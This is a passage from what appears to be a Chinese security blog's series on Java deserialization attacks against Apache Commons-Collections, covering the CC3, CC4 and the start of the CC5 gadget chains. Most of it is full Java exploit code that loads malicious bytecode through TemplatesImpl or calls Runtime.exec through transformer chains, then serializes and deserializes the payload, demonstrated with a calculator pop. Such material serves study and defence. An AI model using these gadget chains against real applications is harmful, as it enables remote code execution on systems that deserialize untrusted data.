java.nio.file.Files;  \nimport java.nio.file.Paths;  \n  \n// CC3 链最终 EXPpublic class CC3FinalEXP &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        TemplatesImpl templates = new TemplatesImpl();  \n Class templatesClass = templates.getClass();  \n Field nameField = templatesClass.getDeclaredField(\"_name\");  \n nameField.setAccessible(true);  \n nameField.set(templates,\"Drunkbaby\");  \n  \n Field bytecodesField = templatesClass.getDeclaredField(\"_bytecodes\");  \n bytecodesField.setAccessible(true);  \n byte[] evil = Files.readAllBytes(Paths.get(\"E://Calc.class\"));  \n byte[][] codes = &#123;evil&#125;;  \n bytecodesField.set(templates,codes);  \n  \n Field tfactoryField = templatesClass.getDeclaredField(\"_tfactory\");  \n tfactoryField.setAccessible(true);  \n tfactoryField.set(templates, new TransformerFactoryImpl());  \n //    templates.newTransformer();  \n  \n InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,  \n new Object[]&#123;templates&#125;);  \n instantiateTransformer.transform(TrAXFilter.class);  \n &#125;  \n&#125;\n\n\n\n后半部分 EXP 写好了，我们去找入口类的前半部分。而前半部分链子从谁调用了 transform 方法开始，所以 CC1 链和 CC6 链的前半部分 EXP 都是有效的。我们直接搬进来试一下。\nCC1 链作为前半部分\n后续发现这段 EXP 报错了\n\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  \nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  \nimport org.apache.commons.collections.Transformer;  \nimport org.apache.commons.collections.functors.ConstantTransformer;  \nimport org.apache.commons.collections.functors.InstantiateTransformer;  \nimport org.apache.commons.collections.map.LazyMap;  \n  \nimport javax.xml.transform.Templates;  \nimport java.io.*;  \nimport java.lang.reflect.Constructor;  \nimport java.lang.reflect.Field;  \nimport java.lang.reflect.InvocationHandler;  \nimport java.lang.reflect.Proxy;  \nimport java.nio.file.Files;  \nimport java.nio.file.Paths;  \nimport java.util.HashMap;  \nimport java.util.Map;  \n  \n// CC3 链最终 EXPpublic class CC3FinalEXP &#123;  \n    public static void main(String[] args) throws Exception  \n    &#123;  \n        TemplatesImpl templates = new TemplatesImpl();  \n Class templatesClass = templates.getClass();  \n Field nameField = templatesClass.getDeclaredField(\"_name\");  \n nameField.setAccessible(true);  \n nameField.set(templates,\"Drunkbaby\");  \n  \n Field bytecodesField = templatesClass.getDeclaredField(\"_bytecodes\");  \n bytecodesField.setAccessible(true);  \n byte[] evil = Files.readAllBytes(Paths.get(\"E://Calc.class\"));  \n byte[][] codes = &#123;evil&#125;;  \n bytecodesField.set(templates,codes);  \n  \n Field tfactoryField = templatesClass.getDeclaredField(\"_tfactory\");  \n tfactoryField.setAccessible(true);  \n tfactoryField.set(templates, new TransformerFactoryImpl());  \n //    templates.newTransformer();  \n  \n InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,  \n new Object[]&#123;templates&#125;);  \n HashMap&lt;Object, Object> hashMap = new HashMap&lt;>();  \n Map decorateMap = LazyMap.decorate(hashMap, instantiateTransformer);  \n  \n Class c = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");  \n Constructor declaredConstructor = c.getDeclaredConstructor(Class.class, Map.class);  \n declaredConstructor.setAccessible(true);  \n InvocationHandler invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Override.class, decorateMap);  \n  \n Map proxyMap = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader()  \n                , new Class[]&#123;Map.class&#125;, invocationHandler);  \n Object o = (InvocationHandler) declaredConstructor.newInstance(Override.class, proxyMap);  \n  \n //  serialize(o);  \n unserialize(\"ser.bin\");  \n &#125;  \n  \n    public static void serialize(Object obj) throws IOException &#123;  \n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\"));  \n oos.writeObject(obj);  \n &#125;  \n  \n    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException &#123;  \n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));  \n Object obj = ois.readObject();  \n return obj;  \n &#125;  \n&#125;\n\n\n这段 EXP 在序列化的时候是没问题的，在反序列化的时候报错了，报错说我们传入 instantiateTransformer 是一个字符串而不是一个类，我当时人就傻了。啊？明明是一个类啊，不是字符串啊，怎么回事？\n\n我打了断点调试还是想不明白，后续才知道是因为 CC1 链的老问题，setValue() 的传参无法控制，需要引入 Transformer 与 ChainedTransformer 加以辅助。\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  \nimport com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  \nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  \nimport org.apache.commons.collections.Transformer;  \nimport org.apache.commons.collections.functors.ChainedTransformer;  \nimport org.apache.commons.collections.functors.ConstantTransformer;  \nimport org.apache.commons.collections.functors.InstantiateTransformer;  \nimport org.apache.commons.collections.functors.InvokerTransformer;  \nimport org.apache.commons.collections.map.LazyMap;  \n  \nimport javax.xml.transform.Templates;  \nimport java.io.*;  \nimport java.lang.reflect.Constructor;  \nimport java.lang.reflect.Field;  \nimport java.lang.reflect.InvocationHandler;  \nimport java.lang.reflect.Proxy;  \nimport java.nio.file.Files;  \nimport java.nio.file.Paths;  \nimport java.util.HashMap;  \nimport java.util.Map;  \n  \n// CC3 链最终 EXPpublic class CC3FinalEXP &#123;  \n    public static void main(String[] args) throws Exception  \n    &#123;  \n        TemplatesImpl templates = new TemplatesImpl();  \n Class templatesClass = templates.getClass();  \n Field nameField = templatesClass.getDeclaredField(\"_name\");  \n nameField.setAccessible(true);  \n nameField.set(templates,\"Drunkbaby\");  \n  \n Field bytecodesField = templatesClass.getDeclaredField(\"_bytecodes\");  \n bytecodesField.setAccessible(true);  \n byte[] evil = Files.readAllBytes(Paths.get(\"E://Calc.class\"));  \n byte[][] codes = &#123;evil&#125;;  \n bytecodesField.set(templates,codes);  \n  \n Field tfactoryField = templatesClass.getDeclaredField(\"_tfactory\");  \n tfactoryField.setAccessible(true);  \n tfactoryField.set(templates, new TransformerFactoryImpl());  \n //    templates.newTransformer();  \n  \n InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,  \n new Object[]&#123;templates&#125;);  \n Transformer[] transformers = new Transformer[]&#123;  \n                new ConstantTransformer(TrAXFilter.class), // 构造 setValue 的可控参数  \n instantiateTransformer  \n        &#125;;  \n ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  \n HashMap&lt;Object, Object> hashMap = new HashMap&lt;>();  \n Map decorateMap = LazyMap.decorate(hashMap, chainedTransformer);  \n  \n Class c = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");  \n Constructor declaredConstructor = c.getDeclaredConstructor(Class.class, Map.class);  \n declaredConstructor.setAccessible(true);  \n InvocationHandler invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Override.class, decorateMap);  \n  \n Map proxyMap = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader()  \n                , new Class[]&#123;Map.class&#125;, invocationHandler);  \n Object o = (InvocationHandler) declaredConstructor.newInstance(Override.class, proxyMap);  \n  \n serialize(o);  \n unserialize(\"ser.bin\");  \n &#125;  \n  \n    public static void serialize(Object obj) throws IOException &#123;  \n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\"));  \n oos.writeObject(obj);  \n &#125;  \n  \n    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException &#123;  \n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));  \n Object obj = ois.readObject();  \n return obj;  \n &#125;  \n&#125;\n\n\n\nCC6 链作为前半部分\n如法炮制\n\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  \nimport com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  \nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  \nimport org.apache.commons.collections.Transformer;  \nimport org.apache.commons.collections.functors.ChainedTransformer;  \nimport org.apache.commons.collections.functors.ConstantTransformer;  \nimport org.apache.commons.collections.functors.InstantiateTransformer;  \nimport org.apache.commons.collections.keyvalue.TiedMapEntry;  \nimport org.apache.commons.collections.map.LazyMap;  \n  \nimport javax.xml.transform.Templates;  \nimport java.io.*;  \nimport java.lang.reflect.Field;  \nimport java.nio.file.Files;  \nimport java.nio.file.Paths;  \nimport java.util.HashMap;  \nimport java.util.Map;  \n  \n// 用 CC6 链的前半部分链子  \npublic class CC3FinalEXP2 &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        TemplatesImpl templates = new TemplatesImpl();  \n Class templatesClass = templates.getClass();  \n Field nameField = templatesClass.getDeclaredField(\"_name\");  \n nameField.setAccessible(true);  \n nameField.set(templates,\"Drunkbaby\");  \n  \n Field bytecodesField = templatesClass.getDeclaredField(\"_bytecodes\");  \n bytecodesField.setAccessible(true);  \n byte[] evil = Files.readAllBytes(Paths.get(\"E://Calc.class\"));  \n byte[][] codes = &#123;evil&#125;;  \n bytecodesField.set(templates,codes);  \n  \n Field tfactoryField = templatesClass.getDeclaredField(\"_tfactory\");  \n tfactoryField.setAccessible(true);  \n tfactoryField.set(templates, new TransformerFactoryImpl());  \n //    templates.newTransformer();  \n  \n InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,  \n new Object[]&#123;templates&#125;);  \n Transformer[] transformers = new Transformer[]&#123;  \n                new ConstantTransformer(TrAXFilter.class), // 构造 setValue 的可控参数  \n instantiateTransformer  \n        &#125;;  \n ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  \n HashMap&lt;Object, Object> hashMap = new HashMap&lt;>();  \n Map lazyMap = LazyMap.decorate(hashMap, new ConstantTransformer(\"five\")); // 防止在反序列化前弹计算器  \n TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, \"key\");  \n HashMap&lt;Object, Object> expMap = new HashMap&lt;>();  \n expMap.put(tiedMapEntry, \"value\");  \n lazyMap.remove(\"key\");  \n  \n // 在 put 之后通过反射修改值  \n Class&lt;LazyMap> lazyMapClass = LazyMap.class;  \n Field factoryField = lazyMapClass.getDeclaredField(\"factory\");  \n factoryField.setAccessible(true);  \n factoryField.set(lazyMap, chainedTransformer);  \n  \n serialize(expMap);  \n unserialize(\"ser.bin\");  \n &#125;  \n    public static void serialize(Object obj) throws IOException &#123;  \n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\"));  \n oos.writeObject(obj);  \n &#125;  \n    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException&#123;  \n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));  \n Object obj = ois.readObject();  \n return obj;  \n &#125;  \n&#125;\n\n\n\n0x08 小结\nCC3 链作为另外一种命令执行的方式，在原本黑名单的机会当中溜了出来，确实牛逼。\n\n按照惯例整理一下流程图，不过这次的流程图打算和 CC1，CC6 放一起。\n","categories":["Java"],"tags":["Java"]},{"title":"Java反序列化Commons-Collections篇06-CC4链","url":"/2022/06/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8706-CC4%E9%93%BE/","content":"CC4链\n\nJava 反序列化 Commons-Collections 篇 06 CC4 链0x01 前言因为 CommonsCollections4 除 4.0 的其他版本去掉了 InvokerTransformer 的 Serializable 继承，导致无法序列化。\n0x02 环境先说一下 jdk 这个环境，理论上只有 CC1 和 CC3 链受到 jdk 版本影响。为了避免踩坑，我还是用的 jdk8u65 的版本。\n\nJDK8u65\nopenJDK 8u65\nMaven 3.6.3\nCommons-Collections 4.0\n\nMaven 下载 Commons-Collections 依赖。\n&lt;dependency>  \n &lt;groupId>org.apache.commons&lt;/groupId>  \n &lt;artifactId>commons-collections4&lt;/artifactId>  \n &lt;version>4.0&lt;/version>  \n&lt;/dependency>\n\n0x03 CC4 链分析\n因为还是 CC 链的漏洞，所以一般是与 transform 分不开的。\n\n\n从尾部向首部分析，尾部命令执行的方式就两种，反射或是动态加载字节码。因为 CC4 链上只是去掉了 InvokerTransformer 的 Serializable 继承，所以最后的命令执行不受影响。\n\n既然 InvokerTransformer 这里用不了了，我们去找谁调用了 transform() 方法，这里我去找的是 InstantiateTransformer 类，因为它上一步是 InvokerTransformer。\n进行 find usages，在 TransformingComparator 这个类中的 compare() 方法调用了 transform() 方法。而 compare() 这个方法也是我们比较喜欢的这种，因为它非常常见。\n\n\n这就是一条新的链子了，我们继续往前找，发现是 PriorityQueue 这个类中的 siftDownUsingComparator() 方法调用了之前的 compare() 方法。\n\n\n接着在一步步往上找，发现在同一个类中进行的调用，按照顺序应该是这样的，最终是由 PriorityQueue.readObject() 开头。\n\n\n\n至此，链子已经分析完毕，接下来逐步编写 EXP。\n\n0x04 CC4 链逐步 EXP 编写1. EXP 编写\n我们先编写一个 InstantiateTransformer.transform() 的 EXP。\n\n这是动态加载字节码的方式进行命令执行，和上一篇文章的 EXP 一样通过反射修改值，然后执行 transform() 方法。至于 EXP 的编写这里就不细扯了，有需要可以移步至此 Java反序列化Commons-Collections篇04-CC3链\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  \nimport com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  \nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  \nimport org.apache.commons.collections4.functors.ChainedTransformer;  \nimport org.apache.commons.collections4.functors.InstantiateTransformer;  \n  \nimport javax.xml.transform.Templates;  \nimport java.lang.reflect.Field;  \nimport java.nio.file.Files;  \nimport java.nio.file.Paths;  \n  \n// 构造 InstantiateTransformer.transform 的 EXPpublic class TransformOriEXP &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        TemplatesImpl templates = new TemplatesImpl();  \n Class templatesClass = templates.getClass();  \n Field nameField = templatesClass.getDeclaredField(\"_name\");  \n nameField.setAccessible(true);  \n nameField.set(templates,\"Drunkbaby\");  \n  \n Field bytecodesField = templatesClass.getDeclaredField(\"_bytecodes\");  \n bytecodesField.setAccessible(true);  \n byte[] evil = Files.readAllBytes(Paths.get(\"E://Calc.class\"));  \n byte[][] codes = &#123;evil&#125;;  \n bytecodesField.set(templates,codes);  \n  \n Field tfactoryField = templatesClass.getDeclaredField(\"_tfactory\");  \n tfactoryField.setAccessible(true);  \n tfactoryField.set(templates, new TransformerFactoryImpl());  \n //    templates.newTransformer();  \n  \n InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,  \n new Object[]&#123;templates&#125;);  \n  \n instantiateTransformer.transform(TrAXFilter.class);  \n &#125;  \n&#125;\n\n\n代码测试成功，准备进行下一步 EXP 的编写。\n\n\n\n下一步是 TransformingComparator 类的 compare() 方法的调用，因为它的可序列化的，所以我们或许可以通过反射修改其调用 compare() 方法的值。\n\n这里 compare() 要求我们传入两个对象？这里我尝试失败了，发现 transformingComparator.compare() 如何传参都无法达到弹计算器的效果。说明不应该是在这里弹计算器，应该是下一步的 PriorityQueue.siftUpUsingComparator() 来执行。\n\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  \nimport com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  \nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  \nimport org.apache.commons.collections4.Transformer;  \nimport org.apache.commons.collections4.comparators.TransformingComparator;  \nimport org.apache.commons.collections4.functors.ChainedTransformer;  \nimport org.apache.commons.collections4.functors.ConstantTransformer;  \nimport org.apache.commons.collections4.functors.InstantiateTransformer;  \n  \nimport javax.xml.transform.Templates;  \nimport java.io.*;  \nimport java.lang.reflect.Field;  \nimport java.nio.file.Files;  \nimport java.nio.file.Paths;  \nimport java.util.PriorityQueue;  \n  \n// TransformingComparator.compare 的 EXPpublic class ComparatorEXP &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        TemplatesImpl templates = new TemplatesImpl();  \n Class templatesClass = templates.getClass();  \n Field nameField = templatesClass.getDeclaredField(\"_name\");  \n nameField.setAccessible(true);  \n nameField.set(templates,\"Drunkbaby\");  \n  \n Field bytecodesField = templatesClass.getDeclaredField(\"_bytecodes\");  \n bytecodesField.setAccessible(true);  \n byte[] evil = Files.readAllBytes(Paths.get(\"E://Calc.class\"));  \n byte[][] codes = &#123;evil&#125;;  \n bytecodesField.set(templates,codes);  \n  \n Field tfactoryField = templatesClass.getDeclaredField(\"_tfactory\");  \n tfactoryField.setAccessible(true);  \n tfactoryField.set(templates, new TransformerFactoryImpl());  \n //    templates.newTransformer();  \n InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,  \n new Object[]&#123;templates&#125;);  \n Transformer[] transformers = new Transformer[]&#123;  \n                new ConstantTransformer(TrAXFilter.class), // 构造 setValue 的可控参数  \n instantiateTransformer  \n        &#125;;  \n ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  \n //  instantiateTransformer.transform(TrAXFilter.class);  \n  \n TransformingComparator transformingComparator = new TransformingComparator&lt;>(chainedTransformer);  \n PriorityQueue priorityQueue = new PriorityQueue&lt;>(transformingComparator);  \n serialize(priorityQueue);  \n unserialize(\"ser.bin\");  \n &#125;  \n    public static void serialize(Object obj) throws IOException &#123;  \n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\"));  \n oos.writeObject(obj);  \n &#125;  \n    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException&#123;  \n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));  \n Object obj = ois.readObject();  \n return obj;  \n &#125;  \n&#125;\n\n\n从根本上来看，没问题啊！我不知道为啥又不能弹计算器了，下个断点看看吧。\n\n断点位置：PriorityQueue 的 736 行 siftDown() 代码，以及 795 行的 heapify() 代码。Debug 一下。\n\n\n发现在 735 行的时候跳出程序了，原因是这一段 size &gt;&gt;&gt; 1，&gt;&gt;&gt; 是移位运算符。\nvalue >>> num     --   num 指定要移位值 value 移动的位数\n\n具体的算法可以先不搞懂，我们点击 Evaluate Expression，将 size 的值进行替换，知道 size 等于 1 时，才算成功。\n\n\n\n当我们将 Size 的值修改成 2 的时候，得到 Result 为 1，是可以进入循环的，所以现在我们要想办法将 Size 的值变成 2。\n\n\n\n要修改 Size，必然要先明白 Size 是什么，Size 就是 PriorityQueue 这个队列的长度，简单理解，就是数组的长度。现在我们这个数组的长度为 0，0 - 1 &#x3D; -1，所以会直接跳出循环，不能弹计算器。\n通过此语句加上即可。\npriorityQueue.add(1);  \npriorityQueue.add(2);\n\n\n最终的 EXP\n\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  \nimport com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  \nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  \nimport org.apache.commons.collections4.Transformer;  \nimport org.apache.commons.collections4.comparators.TransformingComparator;  \nimport org.apache.commons.collections4.functors.ChainedTransformer;  \nimport org.apache.commons.collections4.functors.ConstantTransformer;  \nimport org.apache.commons.collections4.functors.InstantiateTransformer;  \n  \nimport javax.xml.transform.Templates;  \nimport java.io.*;  \nimport java.lang.reflect.Field;  \nimport java.nio.file.Files;  \nimport java.nio.file.Paths;  \nimport java.util.PriorityQueue;  \n  \n// TransformingComparator.compare 的 EXPpublic class ComparatorEXP &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        TemplatesImpl templates = new TemplatesImpl();  \n Class templatesClass = templates.getClass();  \n Field nameField = templatesClass.getDeclaredField(\"_name\");  \n nameField.setAccessible(true);  \n nameField.set(templates,\"Drunkbaby\");  \n  \n Field bytecodesField = templatesClass.getDeclaredField(\"_bytecodes\");  \n bytecodesField.setAccessible(true);  \n byte[] evil = Files.readAllBytes(Paths.get(\"E://Calc.class\"));  \n byte[][] codes = &#123;evil&#125;;  \n bytecodesField.set(templates,codes);  \n  \n Field tfactoryField = templatesClass.getDeclaredField(\"_tfactory\");  \n tfactoryField.setAccessible(true);  \n tfactoryField.set(templates, new TransformerFactoryImpl());  \n //    templates.newTransformer();  \n InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,  \n new Object[]&#123;templates&#125;);  \n Transformer[] transformers = new Transformer[]&#123;  \n                new ConstantTransformer(TrAXFilter.class), // 构造 setValue 的可控参数  \n instantiateTransformer  \n        &#125;;  \n ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  \n //  instantiateTransformer.transform(TrAXFilter.class);  \n  \n TransformingComparator transformingComparator = new TransformingComparator&lt;>(chainedTransformer);  \n PriorityQueue priorityQueue = new PriorityQueue&lt;>(transformingComparator);  \n priorityQueue.add(1);  \n priorityQueue.add(2);  \n serialize(priorityQueue);  \n unserialize(\"ser.bin\");  \n &#125;  \n    public static void serialize(Object obj) throws IOException &#123;  \n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\"));  \n oos.writeObject(obj);  \n &#125;  \n    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException&#123;  \n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));  \n Object obj = ois.readObject();  \n return obj;  \n &#125;  \n&#125;\n\n\n\n2. Debug 解决问题虽然可以成功弹计算器，但是现在我们写的这个 EXP 还是会报错的，报错原因如下：\n在我们进行 priorityQueue.add(1) 这个语句的时候，它内部会自动进行 compare() 方法的执行，然后调用 transform()，我把图贴出来。\n\n\n现在的这种情况就意味着，我还没有开始序列化与反序列化，代码就跳到弹计算器那里去了，但是由于 _tfactory 为 null，导致报错。\n还记得我们在 CC3 链里面讲的那个 _tfactory 的值吗？\n当时我们是写的这段 EXP\nField tfactoryField = templatesClass.getDeclaredField(\"_tfactory\");  \ntfactoryField.setAccessible(true);  \ntfactoryField.set(templates, new TransformerFactoryImpl());  \ntemplates.newTransformer();\n\n\n我在跑代码的时候把最后一行给注释掉了，所以才会出错。_tfactory 是在反序列化的时候才会加进来的，所以加上就不报错了。不过删掉也无所谓，因为我们本来就不想让其本地执行。\n\n3. 进一步修改 EXP因为我们不需要让代码进行本地执行，所以我们可以先让 transformingComparator 的值成为一个无关的对象，在 add 完之后再用反射修改。\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  \nimport com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  \nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  \nimport org.apache.commons.collections4.Transformer;  \nimport org.apache.commons.collections4.comparators.TransformingComparator;  \nimport org.apache.commons.collections4.functors.ChainedTransformer;  \nimport org.apache.commons.collections4.functors.ConstantTransformer;  \nimport org.apache.commons.collections4.functors.InstantiateTransformer;  \n  \nimport javax.xml.transform.Templates;  \nimport java.io.*;  \nimport java.lang.reflect.Field;  \nimport java.nio.file.Files;  \nimport java.nio.file.Paths;  \nimport java.util.PriorityQueue;  \n  \n// 最终 EXP 版本  \npublic class CC4EXP &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        TemplatesImpl templates = new TemplatesImpl();  \n Class templatesClass = templates.getClass();  \n Field nameField = templatesClass.getDeclaredField(\"_name\");  \n nameField.setAccessible(true);  \n nameField.set(templates,\"Drunkbaby\");  \n  \n Field bytecodesField = templatesClass.getDeclaredField(\"_bytecodes\");  \n bytecodesField.setAccessible(true);  \n byte[] evil = Files.readAllBytes(Paths.get(\"E://Calc.class\"));  \n byte[][] codes = &#123;evil&#125;;  \n bytecodesField.set(templates,codes);  \n  \n//        Field tfactoryField = templatesClass.getDeclaredField(\"_tfactory\");  \n//        tfactoryField.setAccessible(true);  \n//        tfactoryField.set(templates, new TransformerFactoryImpl());  \n//        templates.newTransformer();  \n InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,  \n new Object[]&#123;templates&#125;);  \n Transformer[] transformers = new Transformer[]&#123;  \n                new ConstantTransformer(TrAXFilter.class), // 构造 setValue 的可控参数  \n instantiateTransformer  \n        &#125;;  \n ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  \n //  instantiateTransformer.transform(TrAXFilter.class);  \n  \n TransformingComparator transformingComparator = new TransformingComparator&lt;>(new ConstantTransformer&lt;>(1));  \n PriorityQueue priorityQueue = new PriorityQueue&lt;>(transformingComparator);  \n priorityQueue.add(1);  \n priorityQueue.add(2);  \n  \n Class c = transformingComparator.getClass();  \n Field transformingField = c.getDeclaredField(\"transformer\");  \n transformingField.setAccessible(true);  \n transformingField.set(transformingComparator, chainedTransformer);  \n  \n serialize(priorityQueue);  \n unserialize(\"ser.bin\");  \n &#125;  \n    public static void serialize(Object obj) throws IOException &#123;  \n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\"));  \n oos.writeObject(obj);  \n &#125;  \n    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException&#123;  \n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));  \n Object obj = ois.readObject();  \n return obj;  \n &#125;  \n&#125;\n0x05 小结在学完前面三种 CC 链之后，学 CC4 链确实是如鱼得水，最后我们还是要写个流程图复盘一下。\n","categories":["Java"],"tags":["Java"]},{"title":"Java反序列化Commons-Collections篇07-CC5链","url":"/2022/06/29/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8707-CC5%E9%93%BE/","content":"CC5链\n\nJava 反序列化 Commons-Collections 篇 CC5 链0x01 前言最后两个链子了，冲冲冲！\n0x02 CC5 链分析让我找这里肯定很难找出来，去看了 yso 的官方链子，入口类是 BadAttributeValueExpException 的 readObject() 方法，这一个倒是不难。关键是后面的。\n逆向思维来看的话，LazyMap.get() 方法被 TiedMapEntry.toString() 所调用，而如果去找谁调用了 toString() 这也太多了，太难找了，我们只能正向分析。\n\n直接看官方的链子，再去写 EXP 吧。\n\n大致的流程图如此\n\n\n从 BadAttributeValueExpException 的 readObject() 方法进来。\n\n\n这里调用了 toString() 方法，然后 TiedMapEntry 这个类调用了 toString() 方法。\n\n\nTiedMapEntry 这个类的 toString() 方法调用了 getValue() 方法，在 getValue() 方法中，我们看到了 get() 方法被调用，这就和后续的 LazyMap.get() 对应起来了。\n\n\n0x03 CC5 链 EXP 编写1. LazyMap.get() 的 EXP 编写\n这里 LazyMap 的后面半条链子是可以用的，我们直接把 CC1 那一部分的拿进来。\n\nimport org.apache.commons.collections.Transformer;  \nimport org.apache.commons.collections.functors.ChainedTransformer;  \nimport org.apache.commons.collections.functors.ConstantTransformer;  \nimport org.apache.commons.collections.functors.InvokerTransformer;  \nimport org.apache.commons.collections.keyvalue.TiedMapEntry;  \nimport org.apache.commons.collections.map.LazyMap;  \n  \nimport javax.management.BadAttributeValueExpException;  \nimport java.lang.reflect.Method;  \nimport java.util.HashMap;  \nimport java.util.Map;  \n  \n// LazyMap 后半段的 EXPpublic class LazyMapGetEXP &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        Transformer[] transformers = new Transformer[]&#123;  \n                new ConstantTransformer(Runtime.class), // 构造 setValue 的可控参数  \n new InvokerTransformer(\"getMethod\",  \n new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;\"getRuntime\", null&#125;),  \n new InvokerTransformer(\"invoke\"  \n , new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),  \n new InvokerTransformer(\"exec\", new Class[]&#123;String.class&#125;, new Object[]&#123;\"calc\"&#125;)  \n        &#125;;  \n ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  \n HashMap&lt;Object, Object> hashMap = new HashMap&lt;>();  \n Map decorateMap = LazyMap.decorate(hashMap, chainedTransformer);  \n  \n Class&lt;LazyMap> lazyMapClass = LazyMap.class;  \n Method lazyGetMethod = lazyMapClass.getDeclaredMethod(\"get\", Object.class);  \n lazyGetMethod.setAccessible(true);  \n lazyGetMethod.invoke(decorateMap, chainedTransformer);  \n &#125;  \n&#125;\n\n\n成功弹出计算器。\n\n\n\n下一步我们写 TiedMapEntry 类调用 toString() 方法的 EXP。\n2. TiedMapEntry.toString() EXP 编写这一步不是很难，因为 TiedMapEntry 这个类继承了反序列化，并且是 public 的类，可操纵性非常强。\nEXP 的逻辑这里我觉得也挺简单的，先看 TiedMapEntry 的构造方法，TiedMapEntry 的构造方法中的 map 后续进行了 map.get(key) 的操作，所以只需要将 map 赋值为 decorateMap 即可。\n\n\n编写我们的 EXP\nimport org.apache.commons.collections.Transformer;  \nimport org.apache.commons.collections.functors.ChainedTransformer;  \nimport org.apache.commons.collections.functors.ConstantTransformer;  \nimport org.apache.commons.collections.functors.InvokerTransformer;  \nimport org.apache.commons.collections.keyvalue.TiedMapEntry;  \nimport org.apache.commons.collections.map.LazyMap;  \n  \nimport java.lang.reflect.Method;  \nimport java.util.HashMap;  \nimport java.util.Map;  \n  \n// TiedMapEntry 的 EXP 编写  \npublic class TiedMapEntryEXP &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        Transformer[] transformers = new Transformer[]&#123;  \n                new ConstantTransformer(Runtime.class), // 构造 setValue 的可控参数  \n new InvokerTransformer(\"getMethod\",  \n new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;\"getRuntime\", null&#125;),  \n new InvokerTransformer(\"invoke\"  \n , new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),  \n new InvokerTransformer(\"exec\", new Class[]&#123;String.class&#125;, new Object[]&#123;\"calc\"&#125;)  \n        &#125;;  \n ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  \n HashMap&lt;Object, Object> hashMap = new HashMap&lt;>();  \n Map decorateMap = LazyMap.decorate(hashMap, chainedTransformer);  \n 